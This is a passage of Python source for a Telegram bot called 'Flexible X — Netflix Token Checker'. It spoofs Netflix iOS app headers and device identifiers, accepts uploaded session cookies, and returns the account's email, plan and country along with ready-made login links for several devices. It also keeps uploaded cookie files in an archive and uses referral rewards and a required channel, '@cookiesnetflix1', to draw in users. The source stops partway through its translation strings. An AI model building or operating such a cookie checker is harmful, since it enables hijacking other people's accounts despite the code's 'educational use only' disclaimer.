import asyncio
import html as html_mod
import os
import json
import re
import time
import urllib.parse
import hashlib
import zipfile
import io
from datetime import datetime
from pathlib import Path
import requests
from urllib3.exceptions import InsecureRequestWarning
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
)

# ==================== CONFIGURATION ====================
OWNER_ID = 1249057893
CHANNEL_USERNAME = "@cookiesnetflix1"
CHANNEL_ID = None

from netflix_account import fetch_account_info_sync

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

BOT_DISPLAY_NAME = "Flexible X"
WAITING_FOR_FILE = 1
DEFAULT_LANG = "en"

# Referral System Config
REFERRAL_BONUS_PER_USER = 3
REFERRAL_MAX_DAILY_LIMIT = 50
BASE_DAILY_LIMIT = 24

# === RAILWAY VOLUME PATHS ===
VOLUME_ROOT = Path("/mnt/data")
ARCHIVE_ROOT = VOLUME_ROOT / "archive"
USERS_FILE = VOLUME_ROOT / "users.txt"
REFERRALS_FILE = VOLUME_ROOT / "referrals.json"
RATE_LIMITS_FILE = VOLUME_ROOT / "rate_limits.json"

# Netflix iOS API params
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

MAX_FILE_SIZE_KB = 50
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_KB * 1024
COMPRESSED_EXTENSIONS = {".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".iso"}

user_states = {}

# ==================== MULTI-LANGUAGE SYSTEM ====================

TRANSLATIONS = {
    "en": {
        "lang_name": "🇬🇧 English",
        "welcome_title": "🎬 <b>Flexible X — Netflix Token Checker</b>",
        "welcome_desc": "👋 Welcome! I extract direct login links and account details from your Netflix cookies.",
        "formats_title": "📋 <b>Supported Formats:</b>",
        "fmt_netscape": "• 📄 <b>Netscape Files</b> (.txt)",
        "fmt_json": "• 📦 <b>JSON Files</b> (.json)",
        "fmt_raw": "• 📝 <b>Raw Header Strings</b> (paste directly)",
        "how_to_title": "🚀 <b>How to start:</b>",
        "step1": "1️⃣ Tap <b>📥 Scan New File</b> below",
        "step2": "2️⃣ Upload any supported file or paste raw cookies",
        "step3": "3️⃣ Get your results instantly!",
        "disclaimer": "⚠️ <i>Educational use only. Check only cookies you own.</i>",
        "channel_label": "📢 Required channel:",
        "ask_title": "📤 <b>Ready to Scan</b>",
        "ask_desc": "Send your cookies in ANY format:",
        "ask_note": "<i>All formats are accepted and processed automatically.</i>",
        "invalid_title": "❌ <b>Invalid or Expired Cookie</b>",
        "invalid_desc": "We could not retrieve a valid token. This usually means:",
        "inv_reason1": "• Cookie is incomplete or missing NetflixId",
        "inv_reason2": "• Session has expired or been logged out",
        "inv_reason3": "• Netflix temporarily blocked the request",
        "retry_title": "💡 <b>Try again:</b>",
        "retry1": "1. Export fresh cookies from your browser",
        "retry2": "2. Ensure NetflixId is included",
        "retry3": "3. Wait a few minutes and retry",
        "retry_hint": "<i>Tap 🔁 Restart below to try again.</i>",
        "ref_title": "🎁 <b>Referral & Rewards System</b>",
        "ref_desc": "Invite friends and earn <b>+3 extra daily scans</b> for each person who joins!",
        "ref_how_title": "📌 <b>How it works:</b>",
        "ref_step1": "1️⃣ Share your unique invite link below",
        "ref_step2": "2️⃣ Your friend starts the bot & joins the channel",
        "ref_step3": "3️⃣ Your friend sends at least 1 cookie check",
        "ref_step4": "4️⃣ You get +3 daily scans automatically!",
        "ref_stats_title": "📊 <b>Your stats:</b>",
        "ref_friends": "• 👥 Friends invited:",
        "ref_bonus": "• 🎯 Bonus scans earned:",
        "ref_limit": "• 📈 Current daily limit:",
        "ref_link_label": "🔗 <b>Your invite link:</b>",
        "ref_copy_hint": "<i>Tap the link above to copy it!</i>",
        "btn_channel": "📢 Channel",
        "btn_scan": "📥 Scan New File",
        "btn_referral": "🎁 Referral & Rewards",
        "btn_back": "🔙 Back to Menu",
        "btn_change_lang": "🌐 Change Language",
        "btn_pc": "🖥️ Login PC",
        "btn_tv": "📺 Login TV",
        "btn_android": "🤖 Login Android",
        "btn_iphone": "🍏 Login iPhone",
        "btn_upload": "📥 Upload File",
        "btn_restart": "🔁 Restart",
        "btn_join": "Join channel",
        "btn_joined": "I Joined ✅",
        "success_title": "✅ <b>Account is Active</b>",
        "scan_time": "⏱ <b>Scan Time:</b>",
        "plan": "📄 <b>Plan:</b>",
        "email": "✉️ <b>Email:</b>",
        "country": "🌍 <b>Country:</b>",
        "profiles": "👥 <b>Profiles:</b>",
        "extra_members": "Extra members:",
        "extra_yes": "Allowed",
        "extra_no": "Not allowed",
        "features": "⚙️ <b>Features:</b>",
        "login_hint": "🔽 <i>Use the buttons below to login</i>",
        "acct_fail": "❗ <i>Could not retrieve account page (cookie may be expired or blocked).</i>",
        "balance_line": "📊 <b>Remaining scans:</b> {used}/{limit} ({remaining} left)",
        "daily_used": "Your daily scans:",
        "select_lang_title": "🌐 <b>Select Your Language</b>",
        "select_lang_desc": "Choose your preferred language to continue:",
        "join_required": "To use this bot you must subscribe to our channel: {channel}\n\nPlease join the channel, then press the button below and I will check again.",
        "joined_ok": "Thanks — I see you joined. Now send the cookie file or paste the cookie text.",
        "not_joined": "I still can't see you as a channel member. Make sure you joined the channel with the same account and press 'I Joined'.",
        "press_scan_first": "⚠️ Please press the (📥 Scan New File) button first before sending the file.",
        "no_compressed": "❌ Sorry, compressed files are not accepted.",
        "file_too_large": "⚠️ The file size is too large! The maximum allowed size is 50 KB only.",
        "wrong_format": "⚠️ Please send a .txt or .json file containing your Netflix cookies.",
        "init": "⏳ <b>Initializing...</b>",
        "anim_validating": "Validating cookie format...",
        "anim_connecting": "Connecting to Netflix servers...",
        "anim_extracting": "Extracting authentication token...",
        "anim_fetching": "Fetching account details...",
        "err_read_cookies": "❌ Could not read the cookies. Please check the format and try again.",
        "err_connection": "⚠️ Connection error:",
        "err_unexpected": "⚠️ Unexpected error:",
        "stuck_hint": "If you are stuck, please click the button below or send /start to reset the bot.",
        "new_user_notify": "👤 <b>New user joined the bot!</b>",
        "backup_data_caption": "📦 <b>Data Backup Complete</b>\n\nIncludes:\n• users.txt\n• referrals.json\n\n<i>User data is safe for host migration.</i>",
        "backup_files_progress": "⏳ <b>Compressing archive files...</b>\nThis may take a moment.",
        "backup_files_caption": "📦 <b>Archive Backup Complete</b>\n\n• Files included: <b>{count}</b>\n• Source: <code>/mnt/data/archive/</code>",
        "clear_success": "🗑️ <b>Archive Cleared Successfully</b>\n\n• Files deleted: <b>{count}</b>\n• Path cleared: <code>/mnt/data/archive/</code>\n\n✅ <b>User data is untouched:</b>\n• users.txt ✅\n• referrals.json ✅\n• rate_limits.json ✅",
        "limit_reached": "⛔ <b>Daily limit reached.</b>\nYou can process up to {limit} files per 24 hours.\nTry again in <b>{time}</b>.\n\n💡 <i>Invite friends to increase your limit!</i>",
        "slow_down": "⏳ <b>Slow down!</b>\nYou sent {batch} files in a row.\nPlease wait <b>{time}</b> before sending more.",
        "more_profiles": "+{count} more",
    },
    "ar": {
        "lang_name": "🇦🇪 العربية",
        "welcome_title": "🎬 <b>فليكس إكس — مدقق توكن نتفليكس</b>",
        "welcome_desc": "👋 مرحباً! أستخرج روابط تسجيل الدخول المباشرة وتفاصيل الحساب من كوكيز نتفليكس الخاصة بك.",
        "formats_title": "📋 <b>الصيغ المدعومة:</b>",
        "fmt_netscape": "• 📄 <b>ملفات نتسكيب</b> (.txt)",
        "fmt_json": "• 📦 <b>ملفات JSON</b> (.json)",
        "fmt_raw": "• 📝 <b>نصوص الهيدر الخام</b> (الصق مباشرة)",
        "how_to_title": "🚀 <b>كيف تبدأ:</b>",
        "step1": "1️⃣ اضغط <b>📥 فحص ملف جديد</b> أدناه",
        "step2": "2️⃣ ارفع أي ملف مدعوم أو الصق الكوكيز",
        "step3": "3️⃣ احصل على النتائج فوراً!",
        "disclaimer": "⚠️ <i>للاستخدام التعليمي فقط. افحص الكوكيز التي تملكها فقط.</i>",
        "channel_label": "📢 القناة المطلوبة:",
        "ask_title": "📤 <b>جاهز للفحص</b>",
        "ask_desc": "أرسل الكوكيز بأي صيغة:",
        "ask_note": "<i>جميع الصيغ مقبولة وتُعالج تلقائياً.</i>",
        "invalid_title": "❌ <b>كوكي غير صالح أو منتهي</b>",
        "invalid_desc": "لم نتمكن من الحصول على توكن صالح. هذا يعني عادة:",
        "inv_reason1": "• الكوكي ناقص أو يفتقر إلى NetflixId",
        "inv_reason2": "• انتهت صلاحية الجلسة أو تم تسجيل الخروج",
        "inv_reason3": "• نتفليكس حظر الطلب مؤقتاً",
        "retry_title": "💡 <b>حاول مرة أخرى:</b>",
        "retry1": "1. صدّر كوكيز جديدة من متصفحك",
        "retry2": "2. تأكد من وجود NetflixId",
        "retry3": "3. انتظر بضع دقائق وحاول مجدداً",
        "retry_hint": "<i>اضغط 🔁 إعادة التشغيل أدناه للمحاولة مجدداً.</i>",
        "ref_title": "🎁 <b>نظام الإحالة والمكافآت</b>",
        "ref_desc": "ادعُ أصدقاءك واحصل على <b>+3 فحوصات إضافية يومياً</b> لكل شخص ينضم!",
        "ref_how_title": "📌 <b>كيف يعمل:</b>",
        "ref_step1": "1️⃣ شارك رابط الدعوة الفريد أدناه",
        "ref_step2": "2️⃣ صديقك يبدأ البوت وينضم للقناة",
        "ref_step3": "3️⃣ صديقك يرسل فحص كوكي واحد على الأقل",
        "ref_step4": "4️⃣ تحصل على +3 فحوصات يومية تلقائياً!",
        "ref_stats_title": "📊 <b>إحصائياتك:</b>",
        "ref_friends": "• 👥 الأصدقاء المدعوون:",
        "ref_bonus": "• 🎯 الفحوصات الإضافية:",
        "ref_limit": "• 📈 الحد اليومي الحالي:",
        "ref_link_label": "🔗 <b>رابط دعوتك:</b>",
        "ref_copy_hint": "<i>اضغط على الرابط أعلاه لنسخه!</i>",
        "btn_channel": "📢 القناة",
        "btn_scan": "📥 فحص ملف جديد",
        "btn_referral": "🎁 الإحالة والمكافآت",
        "btn_back": "🔙 العودة للقائمة",
        "btn_change_lang": "🌐 تغيير اللغة",
        "btn_pc": "🖥️ دخول PC",
        "btn_tv": "📺 دخول TV",
        "btn_android": "🤖 دخول أندرويد",
        "btn_iphone": "🍏 دخول آيفون",
        "btn_upload": "📥 رفع ملف",
        "btn_restart": "🔁 إعادة التشغيل",
        "btn_join": "انضم للقناة",
        "btn_joined": "انضممت ✅",
        "success_title": "✅ <b>الحساب نشط</b>",
        "scan_time": "⏱ <b>وقت الفحص:</b>",
        "plan": "📄 <b>الخطة:</b>",
        "email": "✉️ <b>البريد:</b>",
        "country": "🌍 <b>الدولة:</b>",
        "profiles": "👥 <b>الملفات الشخصية:</b>",
        "extra_members": "الأعضاء الإضافيون:",
        "extra_yes": "مسموح",
        "extra_no": "غير مسموح",
        "features": "⚙️ <b>الميزات:</b>",
        "login_hint": "🔽 <i>استخدم الأزرار أدناه لتسجيل الدخول</i>",
        "acct_fail": "❗ <i>تعذر استرجاع صفحة الحساب (قد يكون الكوكي منتهياً أو محظوراً).</i>",
        "balance_line": "📊 <b>الفحوصات المتبقية:</b> {used}/{limit} ({remaining} متبقي)",
        "daily_used": "فحوصاتك اليومية:",
        "select_lang_title": "🌐 <b>اختر لغتك</b>",
        "select_lang_desc": "اختر لغتك المفضلة للمتابعة:",
        "join_required": "لاستخدام هذا البوت يجب الاشتراك في قناتنا: {channel}\n\nيرجى الانضمام للقناة ثم الضغط على الزر أدناه للتحقق مجدداً.",
        "joined_ok": "شكراً — أرى أنك انضممت. الآن أرسل ملف الكوكيز أو الصق النص.",
        "not_joined": "لا أزال لا أراك كعضو في القناة. تأكد من الانضمام بنفس الحساب واضغط 'انضممت'.",
        "press_scan_first": "⚠️ يرجى الضغط على زر (📥 فحص ملف جديد) أولاً قبل إرسال الملف.",
        "no_compressed": "❌ عذراً، الملفات المضغوطة غير مقبولة.",
        "file_too_large": "⚠️ حجم الملف كبير جداً! الحد الأقصى المسموح هو 50 كيلوبايت فقط.",
        "wrong_format": "⚠️ يرجى إرسال ملف .txt أو .json يحتوي على كوكيز نتفليكس.",
        "init": "⏳ <b>جارٍ التهيئة...</b>",
        "anim_validating": "التحقق من صيغة الكوكيز...",
        "anim_connecting": "الاتصال بخوادم نتفليكس...",
        "anim_extracting": "استخراج توكن المصادقة...",
        "anim_fetching": "جلب تفاصيل الحساب...",
        "err_read_cookies": "❌ تعذر قراءة الكوكيز. يرجى التحقق من الصيغة والمحاولة مجدداً.",
        "err_connection": "⚠️ خطأ في الاتصال:",
        "err_unexpected": "⚠️ خطأ غير متوقع:",
        "stuck_hint": "إذا كنت عالِقاً، اضغط على الزر أدناه أو أرسل /start لإعادة تعيين البوت.",
        "new_user_notify": "👤 <b>مستخدم جديد انضم للبوت!</b>",
        "backup_data_caption": "📦 <b>اكتمل نسخ البيانات احتياطياً</b>\n\nيشمل:\n• users.txt\n• referrals.json",
        "backup_files_progress": "⏳ <b>جارٍ ضغط ملفات الأرشيف...</b>\nقد يستغرق هذا لحظة.",
        "backup_files_caption": "📦 <b>اكتمل نسخ الأرشيف احتياطياً</b>\n\n• الملفات: <b>{count}</b>\n• المصدر: <code>/mnt/data/archive/</code>",
        "clear_success": "🗑️ <b>تم مسح الأرشيف بنجاح</b>\n\n• الملفات المحذوفة: <b>{count}</b>\n• المسار: <code>/mnt/data/archive/</code>\n\n✅ <b>بيانات المستخدم لم تتأثر:</b>\n• users.txt ✅\n• referrals.json ✅\n• rate_limits.json ✅",
        "limit_reached": "⛔ <b>تم الوصول للحد اليومي.</b>\nيمكنك معالجة حتى {limit} ملفاً كل 24 ساعة.\nحاول مجدداً خلال <b>{time}</b>.\n\n💡 <i>ادعُ أصدقاءك لزيادة حدك!</i>",
        "slow_down": "⏳ <b>تمهل!</b>\nأرسلت {batch} ملفات متتالية.\nانتظر <b>{time}</b> قبل الإرسال مجدداً.",
        "more_profiles": "+{count} المزيد",
    },
    "fr": {
        "lang_name": "🇫🇷 Français",
        "welcome_title": "🎬 <b>Flexible X — Vérificateur de Token Netflix</b>",
        "welcome_desc": "👋 Bienvenue ! J'extrais les liens de connexion directs et les détails du compte à partir de vos cookies Netflix.",
        "formats_title": "📋 <b>Formats supportés :</b>",
        "fmt_netscape": "• 📄 <b>Fichiers Netscape</b> (.txt)",
        "fmt_json": "• 📦 <b>Fichiers JSON</b> (.json)",
        "fmt_raw": "• 📝 <b>Chaînes d'en-tête brutes</b> (coller directement)",
        "how_to_title": "🚀 <b>Comment commencer :</b>",
        "step1": "1️⃣ Appuyez sur <b>📥 Scanner un fichier</b> ci-dessous",
        "step2": "2️⃣ Envoyez un fichier supporté ou collez les cookies",
        "step3": "3️⃣ Obtenez vos résultats instantanément !",
        "disclaimer": "⚠️ <i>Usage éducatif uniquement. Vérifiez uniquement vos propres cookies.</i>",
        "channel_label": "📢 Chaîne requise :",
        "ask_title": "📤 <b>Prêt à scanner</b>",
        "ask_desc": "Envoyez vos cookies dans N'IMPORTE QUEL format :",
        "ask_note": "<i>Tous les formats sont acceptés et traités automatiquement.</i>",
        "invalid_title": "❌ <b>Cookie invalide ou expiré</b>",
        "invalid_desc": "Nous n'avons pas pu récupérer un token valide. Cela signifie généralement :",
        "inv_reason1": "• Le cookie est incomplet ou manque NetflixId",
        "inv_reason2": "• La session a expiré ou vous êtes déconnecté",
        "inv_reason3": "• Netflix a temporairement bloqué la requête",
        "retry_title": "💡 <b>Réessayez :</b>",
        "retry1": "1. Exportez de nouveaux cookies depuis votre navigateur",
        "retry2": "2. Assurez-vous que NetflixId est inclus",
        "retry3": "3. Attendez quelques minutes et réessayez",
        "retry_hint": "<i>Appuyez sur 🔁 Redémarrer ci-dessous pour réessayer.</i>",
        "ref_title": "🎁 <b>Système de parrainage et récompenses</b>",
        "ref_desc": "Invitez des amis et gagnez <b>+3 scans quotidiens supplémentaires</b> par personne qui rejoint !",
        "ref_how_title": "📌 <b>Comment ça marche :</b>",
        "ref_step1": "1️⃣ Partagez votre lien d'invitation unique ci-dessous",
        "ref_step2": "2️⃣ Votre ami démarre le bot et rejoint la chaîne",
        "ref_step3": "3️⃣ Votre ami envoie au moins 1 vérification de cookie",
        "ref_step4": "4️⃣ Vous obtenez +3 scans quotidiens automatiquement !",
        "ref_stats_title": "📊 <b>Vos statistiques :</b>",
        "ref_friends": "• 👥 Amis invités :",
        "ref_bonus": "• 🎯 Scans bonus gagnés :",
        "ref_limit": "• 📈 Limite quotidienne actuelle :",
        "ref_link_label": "🔗 <b>Votre lien d'invitation :</b>",
        "ref_copy_hint": "<i>Appuyez sur le lien ci-dessus pour le copier !</i>",
        "btn_channel": "📢 Chaîne",
        "btn_scan": "📥 Scanner un fichier",
        "btn_referral": "🎁 Parrainage",
        "btn_back": "🔙 Retour au menu",
        "btn_change_lang": "🌐 Changer la langue",
        "btn_pc": "🖥️ Connexion PC",
        "btn_tv": "📺 Connexion TV",
        "btn_android": "🤖 Connexion Android",
        "btn_iphone": "🍏 Connexion iPhone",
        "btn_upload": "📥 Envoyer un fichier",
        "btn_restart": "🔁 Redémarrer",
        "btn_join": "Rejoindre la chaîne",
        "btn_joined": "J'ai rejoint ✅",
        "success_title": "✅ <b>Le compte est actif</b>",
        "scan_time": "⏱ <b>Heure du scan :</b>",
        "plan": "📄 <b>Forfait :</b>",
        "email": "✉️ <b>Email :</b>",
        "country": "🌍 <b>Pays :</b>",
        "profiles": "👥 <b>Profils :</b>",
        "extra_members": "Membres supplémentaires :",
        "extra_yes": "Autorisé",
        "extra_no": "Non autorisé",
        "features": "⚙️ <b>Fonctionnalités :</b>",
        "login_hint": "🔽 <i>Utilisez les boutons ci-dessous pour vous connecter</i>",
        "acct_fail": "❗ <i>Impossible de récupérer la page du compte (le cookie est peut-être expiré ou bloqué).</i>",
        "balance_line": "📊 <b>Scans restants :</b> {used}/{limit} ({remaining} restant)",
        "daily_used": "Vos scans quotidiens :",
        "select_lang_title": "🌐 <b>Choisissez votre langue</b>",
        "select_lang_desc": "Sélectionnez votre langue préférée pour continuer :",
        "join_required": "Pour utiliser ce bot, vous devez vous abonner à notre chaîne : {channel}\n\nVeuillez rejoindre la chaîne puis appuyer sur le bouton ci-dessous.",
        "joined_ok": "Merci — je vois que vous avez rejoint. Envoyez maintenant le fichier cookie ou collez le texte.",
        "not_joined": "Je ne vous vois toujours pas comme membre. Assurez-vous d'avoir rejoint avec le même compte et appuyez sur 'J'ai rejoint'.",
        "press_scan_first": "⚠️ Veuillez d'abord appuyer sur le bouton (📥 Scanner un fichier) avant d'envoyer le fichier.",
        "no_compressed": "❌ Désolé, les fichiers compressés ne sont pas acceptés.",
        "file_too_large": "⚠️ Le fichier est trop volumineux ! La taille maximale autorisée est de 50 Ko.",
        "wrong_format": "⚠️ Veuillez envoyer un fichier .txt ou .json contenant vos cookies Netflix.",
        "init": "⏳ <b>Initialisation...</b>",
        "anim_validating": "Validation du format des cookies...",
        "anim_connecting": "Connexion aux serveurs Netflix...",
        "anim_extracting": "Extraction du token d'authentification...",
        "anim_fetching": "Récupération des détails du compte...",
        "err_read_cookies": "❌ Impossible de lire les cookies. Vérifiez le format et réessayez.",
        "err_connection": "⚠️ Erreur de connexion :",
        "err_unexpected": "⚠️ Erreur inattendue :",
        "stuck_hint": "Si vous êtes bloqué, cliquez sur le bouton ci-dessous ou envoyez /start.",
        "new_user_notify": "👤 <b>Nouvel utilisateur a rejoint le bot !</b>",
        "backup_data_caption": "📦 <b>Sauvegarde des données terminée</b>",
        "backup_files_progress": "⏳ <b>Compression des fichiers d'archive...</b>",
        "backup_files_caption": "📦 <b>Sauvegarde de l'archive terminée</b>\n\n• Fichiers : <b>{count}</b>",
        "clear_success": "🗑️ <b>Archive effacée avec succès</b>\n\n• Fichiers supprimés : <b>{count}</b>",
        "limit_reached": "⛔ <b>Limite quotidienne atteinte.</b>\nVous pouvez traiter jusqu'à {limit} fichiers par 24h.\nRéessayez dans <b>{time}</b>.",
        "slow_down": "⏳ <b>Ralentissez !</b>\nVous avez envoyé {batch} fichiers d'affilée.\nAttendez <b>{time}</b>.",
        "more_profiles": "+{count} de plus",
    },
    "es": {
        "lang_name": "🇪🇸 Español",
        "welcome_title": "🎬 <b>Flexible X — Verificador de Token Netflix</b>",
        "welcome_desc": "👋 ¡Bienvenido! Extraigo enlaces de inicio de sesión directos y detalles de cuenta de tus cookies de Netflix.",
        "formats_title": "📋 <b>Formatos soportados:</b>",
        "fmt_netscape": "• 📄 <b>Archivos Netscape</b> (.txt)",
        "fmt_json": "• 📦 <b>Archivos JSON</b> (.json)",
        "fmt_raw": "• 📝 <b>Cadenas de encabezado</b> (pegar directamente)",
        "how_to_title": "🚀 <b>Cómo empezar:</b>",
        "step1": "1️⃣ Toca <b>📥 Escanear archivo</b> abajo",
        "step2": "2️⃣ Sube cualquier archivo soportado o pega cookies",
        "step3": "3️⃣ ¡Obtén tus resultados al instante!",
        "disclaimer": "⚠️ <i>Solo uso educativo. Verifica solo cookies propias.</i>",
        "channel_label": "📢 Canal requerido:",
        "ask_title": "📤 <b>Listo para escanear</b>",
        "ask_desc": "Envía tus cookies en CUALQUIER formato:",
        "ask_note": "<i>Todos los formatos son aceptados y procesados automáticamente.</i>",
        "invalid_title": "❌ <b>Cookie inválida o expirada</b>",
        "invalid_desc": "No pudimos obtener un token válido. Esto generalmente significa:",
        "inv_reason1": "• La cookie está incompleta o falta NetflixId",
        "inv_reason2": "• La sesión expiró o se cerró",
        "inv_reason3": "• Netflix bloqueó temporalmente la solicitud",
        "retry_title": "💡 <b>Intenta de nuevo:</b>",
        "retry1": "1. Exporta cookies nuevas desde tu navegador",
        "retry2": "2. Asegúrate de incluir NetflixId",
        "retry3": "3. Espera unos minutos e intenta de nuevo",
        "retry_hint": "<i>Toca 🔁 Reiniciar abajo para intentar de nuevo.</i>",
        "ref_title": "🎁 <b>Sistema de referidos y recompensas</b>",
        "ref_desc": "¡Invita amigos y gana <b>+3 escaneos diarios extra</b> por cada persona que se una!",
        "ref_how_title": "📌 <b>Cómo funciona:</b>",
        "ref_step1": "1️⃣ Comparte tu enlace de invitación único abajo",
        "ref_step2": "2️⃣ Tu amigo inicia el bot y se une al canal",
        "ref_step3": "3️⃣ Tu amigo envía al menos 1 verificación de cookie",
        "ref_step4": "4️⃣ ¡Obtienes +3 escaneos diarios automáticamente!",
        "ref_stats_title": "📊 <b>Tus estadísticas:</b>",
        "ref_friends": "• 👥 Amigos invitados:",
        "ref_bonus": "• 🎯 Escaneos bonus ganados:",
        "ref_limit": "• 📈 Límite diario actual:",
        "ref_link_label": "🔗 <b>Tu enlace de invitación:</b>",
        "ref_copy_hint": "<i>¡Toca el enlace arriba para copiarlo!</i>",
        "btn_channel": "📢 Canal",
        "btn_scan": "📥 Escanear archivo",
        "btn_referral": "🎁 Referidos",
        "btn_back": "🔙 Volver al menú",
        "btn_change_lang": "🌐 Cambiar idioma",
        "btn_pc": "🖥️ Iniciar PC",
        "btn_tv": "📺 Iniciar TV",
        "btn_android": "🤖 Iniciar Android",
        "btn_iphone": "🍏 Iniciar iPhone",
        "btn_upload": "📥 Subir archivo",
        "btn_restart": "🔁 Reiniciar",
        "btn_join": "Unirse al canal",
        "btn_joined": "Me uní ✅",
        "success_title": "✅ <b>La cuenta está activa</b>",
        "scan_time": "⏱ <b>Hora del escaneo:</b>",
        "plan": "📄 <b>Plan:</b>",
        "email": "✉️ <b>Email:</b>",
        "country": "🌍 <b>País:</b>",
        "profiles": "👥 <b>Perfiles:</b>",
        "extra_members": "Miembros extra:",
        "extra_yes": "Permitido",
        "extra_no": "No permitido",
        "features": "⚙️ <b>Características:</b>",
        "login_hint": "🔽 <i>Usa los botones abajo para iniciar sesión</i>",
        "acct_fail": "❗ <i>No se pudo recuperar la página de la cuenta (la cookie puede estar expirada o bloqueada).</i>",
        "balance_line": "📊 <b>Escaneos restantes:</b> {used}/{limit} ({remaining} restante)",
        "daily_used": "Tus escaneos diarios:",
        "select_lang_title": "🌐 <b>Selecciona tu idioma</b>",
        "select_lang_desc": "Elige tu idioma preferido para continuar:",
        "join_required": "Para usar este bot debes suscribirte a nuestro canal: {channel}\n\nÚnete al canal y presiona el botón abajo para verificar.",
        "joined_ok": "Gracias — veo que te uniste. Ahora envía el archivo de cookies o pega el texto.",
        "not_joined": "Aún no te veo como miembro. Asegúrate de unirte con la misma cuenta y presiona 'Me uní'.",
        "press_scan_first": "⚠️ Presiona primero el botón (📥 Escanear archivo) antes de enviar el archivo.",
        "no_compressed": "❌ Lo siento, no se aceptan archivos comprimidos.",
        "file_too_large": "⚠️ ¡El archivo es demasiado grande! El tamaño máximo es 50 KB.",
        "wrong_format": "⚠️ Envía un archivo .txt o .json con tus cookies de Netflix.",
        "init": "⏳ <b>Inicializando...</b>",
        "anim_validating": "Validando formato de cookies...",
        "anim_connecting": "Conectando a servidores Netflix...",
        "anim_extracting": "Extrayendo token de autenticación...",
        "anim_fetching": "Obteniendo detalles de la cuenta...",
        "err_read_cookies": "❌ No se pudieron leer las cookies. Verifica el formato e intenta de nuevo.",
        "err_connection": "⚠️ Error de conexión:",
        "err_unexpected": "⚠️ Error inesperado:",
        "stuck_hint": "Si estás atascado, haz clic en el botón abajo o envía /start.",
        "new_user_notify": "👤 <b>¡Nuevo usuario se unió al bot!</b>",
        "backup_data_caption": "📦 <b>Copia de seguridad de datos completada</b>",
        "backup_files_progress": "⏳ <b>Comprimiendo archivos de archivo...</b>",
        "backup_files_caption": "📦 <b>Copia de seguridad del archivo completada</b>\n\n• Archivos: <b>{count}</b>",
        "clear_success": "🗑️ <b>Archivo limpiado exitosamente</b>\n\n• Archivos eliminados: <b>{count}</b>",
        "limit_reached": "⛔ <b>Límite diario alcanzado.</b>\nPuedes procesar hasta {limit} archivos por 24h.\nIntenta de nuevo en <b>{time}</b>.",
        "slow_down": "⏳ <b>¡Despacio!</b>\nEnviaste {batch} archivos seguidos.\nEspera <b>{time}</b>.",
        "more_profiles": "+{count} más",
    },
    "hi": {
        "lang_name": "🇮🇳 हिन्दी",
        "welcome_title": "🎬 <b>फ्लेक्सिबल एक्स — नेटफ्लिक्स टोकन चेकर</b>",
        "welcome_desc": "👋 स्वागत है! मैं आपके नेटफ्लिक्स कुकीज़ से सीधे लॉगिन लिंक और खाता विवरण निकालता हूँ।",
        "formats_title": "📋 <b>समर्थित प्रारूप:</b>",
        "fmt_netscape": "• 📄 <b>नेटस्केप फ़ाइलें</b> (.txt)",
        "fmt_json": "• 📦 <b>JSON फ़ाइलें</b> (.json)",
        "fmt_raw": "• 📝 <b>रॉ हेडर स्ट्रिंग</b> (सीधे पेस्ट करें)",
        "how_to_title": "🚀 <b>शुरू कैसे करें:</b>",
        "step1": "1️⃣ नीचे <b>📥 नई फ़ाइल स्कैन करें</b> टैप करें",
        "step2": "2️⃣ कोई भी समर्थित फ़ाइल अपलोड करें या कुकीज़ पेस्ट करें",
        "step3": "3️⃣ तुरंत परिणाम प्राप्त करें!",
